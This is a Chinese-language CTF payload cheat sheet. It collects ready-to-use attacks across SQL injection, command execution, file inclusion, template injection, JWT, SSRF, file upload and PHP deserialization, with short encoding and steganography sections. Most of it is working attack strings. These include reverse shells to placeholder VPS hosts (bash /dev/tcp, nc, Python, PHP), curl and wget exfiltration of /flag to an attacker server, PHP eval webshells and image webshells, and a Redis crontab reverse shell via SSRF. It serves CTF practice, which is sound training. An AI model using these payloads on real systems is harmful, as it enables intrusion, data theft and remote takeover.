# Payload 速查表

> 从12篇核心知识文章提取的最高频Payload。做CTF时直接查，不用翻文章。
> 深度阅读：每节标注了来源文章和行号，用 `Read offset=X limit=Y` 查看上下文。

---

## 一、SQL注入

### 1.1 联合注入（有回显）

```sql
# 查字段数
1' order by 1#
1' order by 100#

# 联合查询（假设3个字段，回显位为2）
-1' union select 1,2,3#

# 查库
-1' union select 1,database(),3#

# 查表
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='库名'#

# 查列
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='库名' and table_name='表名'#

# 查数据
-1' union select 1,group_concat(列1,0x3a,列2),3 from 库名.表名#
```

> 来源: SQL.md L1-L24

### 1.2 报错注入（extractvalue/updatexml）

```sql
# extractvalue — 空格和=被过滤时用like替代
1'^extractvalue(1,concat(0x5c,(select(database()))))#
1'^extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('库名'))))#
1'^extractvalue(1,concat(0x7e,(select(left(列名,30))from(库名.表名))))#

# updatexml
1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
1' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)#

# BigInt溢出（exp/pow）
1' and exp(~(select * from (select user())a))#
1' and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))#
```

> 来源: SQL.md L26-L58

### 1.3 堆叠注入

```sql
# 基础操作
1';show databases;#
1';show tables;#
1';show columns from `表名`;#

# rename改表（查无权限的表）
1';RENAME TABLE `表1` TO `表2`;RENAME TABLE `表3` TO `表1`;ALTER TABLE `表1` CHANGE `列1` `列2` VARCHAR(100);#

# handler读取（select被禁时）
1';HANDLER 表名 OPEN;HANDLER 表名 READ FIRST;HANDLER 表名 CLOSE;#

# SQL预处理绕过关键字过滤
PREPARE hacker from concat('s','elect', ' * from `表名` ');
EXECUTE hacker;#
set@a=0x...;prepare hacker from @a;execute hacker;#
```

> 来源: SQL.md L59-L88

### 1.4 盲注

```sql
# 布尔盲注 — 判断库名长度
1' and length(database())>20 #

# 布尔盲注 — 逐字符猜解
1' and ascii(substr(database(),1,1))>100 #

# 布尔盲注 — 查表名
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 #

# 时间盲注 — sleep
1'; IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), NULL)
1'; IF(ascii(substr((select database()),1,1))>100, sleep(3), 0)

# 时间盲注 — benchmark
1'; IF(EXISTS(SELECT * FROM information_schema.tables WHERE table_name='flag'), BENCHMARK(5000000, SHA1('a')), NULL)
```

> 来源: SQL.md L89-L180

### 1.5 WAF绕过常用手法

```sql
# 空格绕过: /**/  %09  %0a  %0b  %0c  %0d  %a0  括号
1'/**/union/**/select/**/1,2,3#

# 等号绕过: like, regexp, between, <>, in
1' and 1 like 1#

# 逗号绕过: join, offset, limit的offset语法
1' union select * from (select 1)a join (select 2)b join (select 3)c#

# 关键字绕过: 双写/大小写/内联注释
1' uniunionon seleselectct 1,2,3#
1' /*!50000union*/ select 1,2,3#

# 等价函数替换
# sleep → benchmark, get_lock
# substring → mid, substr, left, right
# group_concat → 用 limit offset 逐行查
```

> 来源: SQL.md L180-L450

---

## 二、命令执行 / RCE

### 2.1 命令拼接符

```bash
# Linux + Windows 通用
command1 | command2    # 管道：都执行，只返回后者结果
command1 || command2   # OR：前者失败才执行后者
command1 & command2    # 并行：都执行
command1 && command2   # AND：前者成功才执行后者

# Linux 独有
command1;command2      # 顺序：都执行，不管前者成败
```

> 来源: 命令执行.md L73-L91

### 2.2 空格绕过

```bash
$IFS
${IFS}
$IFS$9
<
<>
{cat,flag.php}        # bash花括号展开
%09                   # 制表符(Tab)
```

> 来源: 命令执行.md L92-L106

### 2.3 关键字过滤绕过

```bash
# 过滤 "flag" 的情况
cat fl\ag.php                     # 反斜线转义
cat fl''ag.php                    # 单引号分割
cat fl""ag.php                    # 双引号分割
cat f[l]ag.php                    # 通配符
cat f?ag.php                      # 问号通配
cat fla*.php                      # 星号通配
a=fl;b=ag;cat $a$b.php            # 变量拼接
echo Y2F0IGZsYWcucGhw |base64 -d|bash   # base64编码执行
echo 63617420666c61672e706870|xxd -r -p|bash  # hex编码执行
```

### 2.4 cat 被过滤时的等价命令

```bash
tac      # 从最后一行反向显示
nl       # 带行号显示
more     # 分页显示
less     # 分页显示
head     # 显示前N行
tail     # 显示后N行
sort     # 排序输出
rev      # 反转每行
od       # 八进制/十六进制dump
xxd      # 十六进制dump
```

> 来源: 命令执行.md L107-L145

### 2.5 无回显RCE — 数据带出

```bash
# DNS外带 (dnslog)
curl http://$(whoami).your-dnslog-server.com/
ping $(whoami).your-dnslog-server.com

# HTTP外带
curl http://your-server/$(cat /flag|base64)
wget --post-data="$(cat /flag)" http://your-server/

# 时间盲注
if [ $(cat /flag|cut -c1) = 'f' ]; then sleep 3; fi
```

> 来源: 命令执行.md L195-L308

### 2.6 反弹Shell

```bash
# bash反弹（最常用）
bash -c "bash -i >& /dev/tcp/VPS_IP/PORT 0>&1"
# base64编码版（避免特殊字符问题）
bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA...}|{base64,-d}|{bash,-i}

# nc反弹
nc -e /bin/bash VPS_IP PORT              # 靶机
nc -lvvnp PORT                           # VPS监听

# Python反弹
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP反弹
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# 写shell后执行
echo '<?php eval($_POST[1]);?>' > /var/www/html/shell.php
```

> 来源: 命令执行.md L479-L600

### 2.7 无字母数字Webshell

```php
# 异或构造
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');  // $_='assert'
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');  // $__='_POST'
$___=$$__;
$_($___[_]);  // assert($_POST[_])

# 取反构造
$_=~(%8F%97%8F%96%91%99%90);  // $_='phpinfo'
$__=~(%A0%AF%B0%AC%AB);       // $__='_GET'
$___=$$__;
$_($___[_]);
```

> 来源: 命令执行.md L800-L2000

---

## 三、文件包含 / LFI

### 3.1 PHP伪协议速查

```php
# 读文件（最常用）
php://filter/read=convert.base64-encode/resource=flag.php
php://filter/convert.base64-encode/resource=flag.php

# 代码执行（需allow_url_include=On）
php://input    # POST: <?php system('ls');?>

# 嵌套过滤器
php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=flag.php
```

> 来源: 文件包含.md L104-L203

### 3.2 死亡exit()绕过（file_put_contents + php伪协议）

```php
# 场景: file_put_contents($file, '<?php exit();?>'.$content);

# 法1: convert.base64-decode（推荐）
php://filter/convert.base64-decode/resource=shell.php
# 原理: base64解码遇到非法字符跳过，exit()中的特殊字符被忽略

# 法2: convert.iconv.utf-8.utf-7
php://filter/PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php

# 法3: string.strip_tags（PHP<7.3）
php://filter/string.strip_tags/resource=?>/../shell.php

# 法4: 压缩解压链
php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0dphpinfo();?>/resource=shell.php
```

> 来源: 文件包含.md L224-L318

### 3.3 后缀限制绕过

```php
# 场景: include($_GET['f'].'.php');

# 00截断 (PHP<5.3.4)
lfi.php?f=shell.txt%00

# 长度截断 (PHP<5.2.10, Linux 4096字节)
lfi.php?f=././././[重复].../shell.txt

# zip/phar协议（不在意后缀）
zip://shell.zip#shell
phar://shell.phar/shell

# 点号截断 (Windows, PHP<5.2.10)
lfi.php?f=shell.txt..............................
```

> 来源: 文件包含.md L337-L382

### 3.4 日志包含/Session包含

```bash
# 日志包含
# 1. 将Webshell写入User-Agent访问
# 2. 包含日志文件
/var/log/nginx/access.log
/var/log/apache2/access.log

# Session包含
# 1. 注册时将用户名设为Webshell
# 2. 包含 /tmp/sess_XXXX 或 /var/lib/php/sessions/sess_XXXX
```

### 3.5 pearcmd.php利用

```bash
# LFI + pearcmd（适用于Docker环境）
# 利用 pear install 命令写入shell
/?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://vps/shell.tar
```

> 来源: 文件包含.md L383-L476

---

## 四、SSTI（模板注入）

### 4.1 Python Flask/Jinja2

```python
# 基础探测
{{7*7}}                    # 输出49 → 确认SSTI
{{config}}                 # 查看Flask配置
{{config.items()}}         # 遍历配置

# 查看全局类
''.__class__.__mro__[2].__subclasses__()

# 读文件
{{''.__class__.__mro__[2].__subclasses__()[40]('flag').read()}}
{{url_for.__globals__['__builtins__']['open']('flag').read()}}

# 命令执行 — os.popen
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}

# 命令执行 — subprocess.Popen通用版（无需知道索引）
{% for c in [].__class__.__base__.__subclasses__() %}
  {% if c.__name__=='catch_warnings' %}
    {{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}
  {% endif %}
{% endfor %}

# 命令执行 — eval
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}

# 写文件
{{''.__class__.__mro__[1].__subclasses__()[40]('/tmp/shell', 'w').write('content')}}
```

> 来源: SSTI.md

### 4.2 常见 subclass 索引

不同Python环境索引不同，常见值：
- `<class 'os._wrap_close'>` → 258
- `FileLoader` → 40 (读文件)
- `catch_warnings` → 直接用 `for` 循环找（以上通用版payload）

---

## 五、JWT

### 5.1 算法攻击

```json
# None算法 — header改为None，去掉signature
{"alg":"None","typ":"JWT"}
{"user":"admin"}

# RSA→HMAC — 用公钥签HS256
{"alg":"HS256","typ":"JWT"}
# 将RSA公钥内容作为HMAC密钥签名
```

### 5.2 KID注入

```json
# 任意文件读取
{"alg":"HS256","typ":"JWT","kid":"/etc/passwd"}

# SQL注入
{"alg":"HS256","typ":"JWT","kid":"key' union select 'secretkey' -- "}

# 命令注入（Ruby open函数）
{"alg":"HS256","typ":"JWT","kid":"/path/to/key|whoami"}
```

### 5.3 工具速查

```bash
# jwt-cracker (C语言，爆破弱密钥)
./jwtcrack <token>

# jwt_tool (Python，全功能)
python3 jwt_tool.py <token>    # 交互式

# Python 手动构造
import jwt
jwt.encode({"user":"admin"}, key=None, algorithm="none")
jwt.encode({"user":"admin"}, key=public_key, algorithm="HS256")
```

> 来源: JWT.md L70-L257

---

## 六、SSRF

### 6.1 常用协议

```
# 基础协议
http://127.0.0.1:8080/
file:///etc/passwd
dict://127.0.0.1:6379/info

# gopher万能协议 — 发送自定义TCP数据
gopher://127.0.0.1:6379/_<urlencode_raw_data>
```

### 6.2 gopher攻击Redis（写crontab反弹shell）

```bash
# 利用dict一步步来
dict://127.0.0.1:6379/config:set:dir:/var/spool/cron
dict://127.0.0.1:6379/config:set:dbfilename:root
dict://127.0.0.1:6379/set:1:"\n\n*/1 * * * * bash -i >& /dev/tcp/IP/PORT 0>&1\n\n"
dict://127.0.0.1:6379/save

# gopher一次性打（需先抓包再用socat/gopherus构造）
gopher://127.0.0.1:6379/_%2a1%0d%0a%248%0d%0aflushall...
```

### 6.3 gopher攻击FastCGI

```
# 条件: libcurl>=7.45, PHP-FPM监听, 知道网站绝对路径
gopher://127.0.0.1:9000/_
  %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00
  %0F%13SCRIPT_FILENAME/var/www/html/shell.php     # 要执行的PHP文件
  %0F%16PHP_ADMIN_VALUEauto_prepend_file%20%3D%20php%3A//input
  ...PHP代码...
```

### 6.4 SSRF常用绕过

```
# IP绕过
http://127.0.0.1 → http://0177.0.0.1 (八进制)
http://127.0.0.1 → http://2130706433 (十进制)
http://127.0.0.1 → http://0x7f.0.0.1 (十六进制)
http://127.0.0.1 → http://127.0.0.1.nip.io (DNS)

# URL解析差异
http://expected@evil.com/
http://evil.com#expected.com

# 302跳转
# VPS上部署302重定向到内网地址
```

> 来源: SSRF漏洞.md L555-L750

---

## 七、文件上传

### 7.1 后缀绕过总结

```bash
# 黑名单绕过
.php → .phtml .phps .pht .php5 .php7 .shtml .inc  # 可解析后缀
.php → .Php .pHp                                    # 大小写
.php → .php. .php_ .php::$DATA                      # Windows特性
.php → .php%20 .php%00                              # 空格/截断
.php → .php/. (Nginx)                               # 路径截断
.pphphp → .php                                      # 双写

# .htaccess绕过（Apache）
AddType application/x-httpd-php .png                # 将png当php解析
SetHandler application/x-httpd-php                  # 所有文件当php

# .user.ini绕过（Nginx/Apache+PHP-FPM）
auto_prepend_file=s.png                             # 所有php执行前包含图片马
```

> 来源: 文件上传漏洞.md (全文2115行)

### 7.2 图片马

```bash
# 一句话 + 正常图片
copy /b normal.jpg + shell.php image.jpg
echo '<?php eval($_POST[1]);?>' >> normal.png

# GIF89a头 + PHP
echo 'GIF89a<?php eval($_POST[1]);?>' > shell.gif

# exiftool写马
exiftool -Comment='<?php eval($_POST[1]);?>' image.jpg
```

> 来源: 文件上传漏洞.md

---

## 八、反序列化（PHP）

### 8.1 基础payload格式

```php
// 基本类型
O:<类名长度>:"<类名>":<属性数量>:{<属性>}
s:<长度>:"<字符串>"
i:<整数>
b:0 或 b:1 (布尔)
a:<数量>:{<键值对>}

// 示例
O:3:"Foo":1:{s:3:"cmd";s:2:"ls";}
```

### 8.2 常见魔术方法触发条件

| 方法 | 触发条件 |
|------|---------|
| `__wakeup()` | unserialize() 时调用 |
| `__destruct()` | 对象被销毁时 |
| `__toString()` | 对象被当作字符串使用时 |
| `__call()` | 调用对象不存在的方法时 |
| `__get()` / `__set()` | 访问不存在/不可访问属性时 |
| `__invoke()` | 对象被当作函数调用时 |

### 8.3 phar反序列化

```php
# phar://协议触发 — 文件操作函数都会触发
copy('phar://test.phar/file', $dest);
file_get_contents('phar://test.phar/file');
is_file('phar://test.phar/file');
include('phar://test.phar/file');

# 生成phar文件（需php.ini phar.readonly=Off）
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('file.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new MaliciousClass();  // 放入恶意对象
$phar->setMetadata($o);
$phar->stopBuffering();
```

> 来源: PHP反序列化漏洞总结.md (全篇6959行, 用PHP反序列化漏洞总结.idx.md定位章节)

---

## 九、编码解码速查

### 9.1 Base家族

```bash
# Base64
echo 'dGVzdA==' | base64 -d

# Base32
echo 'ORSXG5A=' | base32 -d    # 大写字母+数字

# Base16 (Hex)
echo '74657374' | xxd -r -p

# Base85 (Ascii85)
python3 -c "import base64; print(base64.a85decode(b'...'))"

# Base58 (Bitcoin风格，无0OIl)
python3 -c "import base58; print(base58.b58decode('...'))"
```

> 现成脚本: CTF常用脚本及工具/Base/

### 9.2 古典密码

| 密码 | 特征 | 工具/脚本 |
|------|------|---------|
| 凯撒 | 字母偏移固定值 | 变异凯撒/ |
| 维吉尼亚 | 密钥循环异或 | 维吉尼亚加密/ |
| 栅栏 | 按列重排 | Python手写 |
| 培根 | AAAAA AAABA格式 | Python手写 |
| Rot13/47 | =凯撒偏移13/47 | rot/ |
| 四方密码 | 4个5x5矩阵 | 四方密码/ |
| 摩斯密码 | .-/空格 | 在线工具 |

### 9.3 常见编码特征识别

```
Base64: [A-Za-z0-9+/=]
Base32: [A-Z2-7=]
Base16: [0-9A-F]
URL编码: %xx
HTML实体: &#NNN; 或 &name;
摩斯: .- 空格分隔
二进制: 0/1 组合
Brainfuck: +-><[]., 
```

---

## 十、压缩包/图片隐写快速命令

```bash
# 压缩包
zip -FF damaged.zip --out repaired.zip     # ZIP修复
fcrackzip -u -D -p rockyou.txt file.zip     # ZIP爆破
archpr / rar2john + john                     # RAR爆破
binwalk -e file.jpg                          # 提取嵌入文件

# PNG
pngcheck -v file.png                         # 检查PNG结构
# CRC爆破宽高 → 脚本: CTF常用脚本及工具/图片爆破宽高/

# 图片通用
strings file.jpg | grep flag                 # 字符串搜索
exiftool file.jpg                            # 元数据
steghide extract -sf file.jpg -p password    # steghide提取
zsteg file.png                               # PNG LSB检测
stegsolve.jar                                # 逐通道分析

# 盲水印
python3 decode.py --original orig.png --image watermarked.png --result out.png
# 脚本: CTF常用脚本及工具/频域盲水印/
```

---

## 快速导航

| 需求 | 知识文章 | WP搜索 | 可用脚本 |
|------|---------|--------|---------|
| SQL注入 | SQL.md (2611行) | grep -rl "SQL\|注入" CTF大赛WP集合/articles/ | sqlmap-Cheat-Sheet.pdf |
| 命令执行 | 命令执行.md (3463行) | grep -rl "RCE\|命令执行\|反弹" CTF大赛WP集合/articles/ | — |
| 文件包含 | 文件包含.md (2617行) | grep -rl "LFI\|文件包含\|伪协议" CTF大赛WP集合/articles/ | 日志匹配/ |
| SSRF | SSRF漏洞.md (1882行) | grep -rl "SSRF\|gopher\|内网" CTF大赛WP集合/articles/ | — |
| SSTI | SSTI.md (270+行) | grep -rl "SSTI\|模板注入\|Jinja2" CTF大赛WP集合/articles/ | — |
| JWT | JWT.md (424行) | grep -rl "JWT\|JsonWebToken" CTF大赛WP集合/articles/ | jwt_tool |
| 反序列化 | PHP反序列化漏洞总结.md (6959行) | grep -rl "反序列化\|unserialize\|phar" CTF大赛WP集合/articles/ | python-Picke序列化/ |
| PHP审计 | php代码审计.md (1641行) | grep -rl "代码审计\|弱类型\|preg_match" CTF大赛WP集合/articles/ | — |
| 图片隐写 | 图片隐写.md (892行) | grep -rl "隐写\|LSB\|宽高\|盲水印" CTF大赛WP集合/articles/ | 图片爆破宽高/ 频域盲水印/ |
| 压缩包 | 压缩包总结.md (643行) | grep -rl "ZIP\|RAR\|CRC\|压缩" CTF大赛WP集合/articles/ | CRC32校验爆破/ 批量解压/ |
| 流量分析 | 工具使用/ | grep -rl "pcap\|USB\|TTL\|流量" CTF大赛WP集合/articles/ | usb流量/ TTL隐写/ |
| 编码解码 | python-note.md | grep -rl "编码\|解码\|Base" CTF大赛WP集合/articles/ | Base/ rot/ 进制互相转换/ |
| RSA | RSA综合脚本利用/ | grep -rl "RSA\|Crypto\|密码" CTF大赛WP集合/articles/ | RSA综合脚本利用/ |

> WP搜索升级: 用 `wp_technique_index.json` 按技术标签精准筛选，代替原始grep。例如:
> ```python
> python3 -c "import json; d=json.load(open('CTF大赛WP集合/wp_technique_index.json')); 
>   xxe=[v for v in d['articles'].values() if 'XXE' in v['techniques']];
>   best=sorted(xxe,key=lambda x:-x['quality_score'])[:5];
>   [print(f'{v[\"quality_score\"]} {v[\"file\"]}') for v in best]"
> ```
